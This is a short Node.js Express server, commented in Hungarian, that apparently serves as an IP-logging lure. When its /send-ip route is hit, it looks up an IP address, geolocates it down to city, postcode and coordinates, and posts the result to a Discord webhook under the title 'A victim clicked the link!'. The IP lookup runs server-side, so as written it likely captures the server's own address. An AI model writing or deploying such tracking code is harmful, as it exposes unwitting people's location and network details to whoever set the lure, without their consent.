require('dotenv').config(); // Betöltjük a .env fájlban lévő változókat

const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// Discord Webhook URL betöltése a környezeti változóból
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

// Statikus fájlok kiszolgálása
app.use(express.static('public'));

// IP cím és hely információ küldése a Discordra
app.get('/send-ip', (req, res) => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const message = {
                        username: "Helyszíni Naplózó <3",
                        avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                        content: `<@1095731086513930260>`,
                        embeds: [
                            {
                                title: 'Egy áldozat rákattintott a linkre!',
                                description: `**IP-cím >> **${ipadd}\n**Hálózat >> ** ${geoData.network}\n**Város >> ** ${geoData.city}\n**Régió >> ** ${geoData.region}\n**Ország >> ** ${geoData.country_name}\n**Irányítószám >> ** ${geoData.postal}\n**Szélesség >> ** ${geoData.latitude}\n**Hosszúság >> ** ${geoData.longitude}`,
                                color: 0x800080
                            }
                        ]
                    };

                    // Küldés Discordra
                    axios.post(webhookUrl, message)
                        .then(response => {
                            res.send('IP-cím és helyadatok sikeresen elküldve Discordra!');
                        })
                        .catch(error => {
                            res.send('Hiba történt a Discord webhook küldésekor.');
                        });
                });
        })
        .catch(error => {
            res.send('Hiba történt az IP cím lekérdezésekor!');
        });
});

// Szerver indítása
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
